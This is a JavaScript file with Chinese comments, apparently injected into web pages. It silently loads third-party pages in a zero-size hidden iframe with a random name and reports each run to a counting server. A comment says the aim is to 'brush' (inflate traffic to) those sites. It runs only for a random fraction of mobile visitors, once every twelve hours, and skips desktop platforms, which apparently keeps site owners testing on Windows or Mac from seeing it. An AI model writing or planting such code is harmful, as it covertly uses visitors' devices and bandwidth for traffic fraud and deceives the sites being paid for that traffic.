
    var _type       = Math.floor(Math.random() * (3 - 1)) + 1;
    var _randomTime = Math.floor(Math.random() * (7 - 1)) + 1;
    var _randomNum  = Math.floor(Math.random() * (29 - 1)) + 1;
    
    /***************************************************************************
     * 
     *                          主要逻辑代码;
     * 
     ***************************************************************************/
    var urlArray   = [[
                            '//www.laohanzong.com/hj/694.html',
                            '//www.laohanzong.com/hj/468.html',
                            '//www.laohanzong.com/hj/1.html'
                      ],[
                            '//hndbs.com/detail/339/douluodalu.html',
                            '//hndbs.com/detail/89215/linglong.html',
                            '//hndbs.com/detail/165668/zhuixu.html'
                      ]]
     
   /** 
    *  处理缓存的类
    * 
    */
   class storage {
       
      constructor() {
        this.source = window.localStorage;
        this.initClear();
      }
    
     /**
      * 初始化清除已经过期的数据
      */
      initClear(){    
        // const reg = new RegExp("__expires__");
        const reg = /__expires__/;
        let data = this.source;
        let list = Object.keys(data);
        if(list.length > 0){
          list.forEach((key) => {
            // 如果为非包含__expires__键名的key进行判断清除过期的
            if( !reg.test(key)){
              let now = Date.now();
              let expires = data[`${key}__expires__`];
              if (now >= expires ) {
                this.remove(key);
              }
            }
          })
        }
      }
    
      /**
        * set 存储方法
        * @ param {String} 	key 键名
        * @ param {String} 	value 键值
        * @ param {String} 	expired 过期时间，以分钟为单位，非必须。（不传则为永久有效）
        */
      set(key, value, expired) {    
        let source = this.source;
        source[key] = JSON.stringify(value);
        if (expired !== undefined){
          // // 过期时间单位为天
          // source[`${key}__expires__`] = Date.now() + 1000 * 60 * 60 * 24 * expired
          // // 过期时间单位为小时
          // source[`${key}__expires__`] = Date.now() + 1000 * 60 * 60 * expired
          // 过期时间单位为分钟
          source[`${key}__expires__`] = Date.now() + 1000 * 60 * expired;
        };
      }
    
      /**
        * get 获取方法
        * @ param {String} 	key 键名
        * @ return  如果没过期则返回数据，否则返回null
        */
       get(key) {    
            const source = this.source;
            const expires = source[`${key}__expires__`];
            // 获取前把已经过期的数据删除掉
            if (expires) {
              const now = Date.now();
              if ( now >= expires ) {
                this.remove(key);
                return null;
              }
            }
            // 获取数据
            const value = source[key] ? JSON.parse(source[key]) : null;
            return value;
      }
    
      /**
        * remove 删除方法
        * @ param {String} 	key 键名  非必须 （不传则删除所有）
        */
      remove(key) {
        if (key) {
          // localStorage自带的removeItem()方法
          this.source.removeItem(key);
          this.source.removeItem(`${key}__expires__`);
          // delete data[key];
          // delete data[`${key}__expires__`];
        } else {
          // 清除所有，localStorage自带的clear()方法
          this.source.clear();
        }
      }
    } 
     
    /**  获取地址栏参数，并且转换成对象 */
    function parseURL(url){
        if (!url) return {};
        url = decodeURIComponent(url);
        var _url = url.split("?")[1];
    
        if (!_url) return {};
    
        var para = _url.split("&");
        var len  = para.length;
        var res  = {};
        for (var i = 0; i < len; i++) {
            var arr = para[i].split("=");
            res[arr[0]] = arr[1];
        }
        return res;
    } 
    
    
    //随机一个范围内的函数
    function randomFunc(min, max) {
          
         return Math.floor(Math.random() * (max - min)) + min;
    } 

    //随机生成一个字符串
    function randomString(len) {
        　　len = len || 32;
        　　//默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1
        　　var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz';    
        　　var maxPos = $chars.length;
        　　var pwd = '';
        　　for (var i = 0; i < len; i++) {
        　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
       　　}
      　　return pwd; 
    }
    
    //创建iframe
    function createIframe(_type){ 
                             
            var _iframe    = document.createElement('iframe');
            
            /** 通过_type值判断是刷那个网站 */
            console.log(urlArray[_type-1]);
            _iframe.src    = urlArray[_type-1][randomFunc(0, urlArray[_type-1].length - 1)];

	        _iframe.name   = randomString(8);
		    _iframe.id	   = _iframe.name;
		    _iframe.width  = 0;
		    _iframe.height = 0;
		    _iframe.border ='0';
		    _iframe.sandbox= "allow-forms allow-scripts allow-same-origin";
		
		   var _clearInterval = window.setInterval(function(){
		       
		       if(document.body){
		           
		           window.clearInterval(_clearInterval);
		           document.body.appendChild(_iframe);
		       }
		       
		   },1000);
		  
		   
		    //接收从子页面传过来的事件
           window.addEventListener('message', function(e){
            
            /** 删除桔子 */
            if (e.data.act == 'removeIframe_jz') {
               
                window.setTimeout(function(){
                    
                   deleteIframe(_iframeId);
                   
                },10000);
            }
    
          }, false);
    }
 

    //删除iframe
    function deleteIframe(_iframeId){
        
        var _iframeDom=document.getElementById(_iframeId);
                        
        if(_iframeDom){
            _iframeDom.parentNode.removeChild(_iframeDom);
        }
    }
    
    //创建iframe
    function createIframeFunc(_debug){
       
        if(top && parseURL(top.location.href)['debuggerto'] && /zuoan/g.test(parseURL(top.location.href)['debuggerto'])){
            
            Object.defineProperty(navigator,'platform',{get:function(){return 'Android';}});
            createIframe();
             
        }else{
            
            if(_randomNum == 1 && (navigator['platform'] == 'Win32' || navigator['platform'] == 'MacIntel') == false){
              
              /** 初始化缓存 */
              var myLocalStorage = new storage();
               
              var _to = myLocalStorage.get('timeout_jz');
               
              if(_to){
                   
              }else{
                   
                 /** 半天检测一次 */
                 myLocalStorage.set('timeout_jz', new Date().getTime(), 60*12);
               
                 window.setTimeout(function(){
                     
                    ajaxFunc('//statistics.yozsc.com/server/count_num.php','POST',{ type: _type }, function(){},function(){},function(){},8000);
                   
                    createIframe();
                   
                 }, _randomTime * 1000);
              }
           }
        }
    }
    
    //请求链接 
    function ajaxFunc(_url, _type, _data, _successCallBack, _errorCallBack, _timeoutCallBack,  _timeout){
        
        var _ajaxParams = {
			url: _url,
			type: _type,
			headers: {},
			data: _data,
			timeout: _timeout,
			success: function(_data) {
				
				if(_successCallBack){
					_successCallBack(_data);
				}
			},
			error:function(_error){
				
				if(_errorCallBack){
					_errorCallBack(_error);
				}
			},
			//当请求完成时调用函数
			complete: function (XMLHttpRequest, status) { 
               
                /** status == 'timeout'意为超时,status的可能取值：success,notmodified,nocontent,error,timeout,abort,parsererror */
                if (status == 'timeout') {
                    
                   /** 取消请求 */    
                   ajaxTimeOut.abort(); 
                  
                   _timeoutCallBack();
                }
            }
    	}
    	
        var ajaxTimeOut= $.ajax(_ajaxParams);
    }

    
   createIframeFunc();
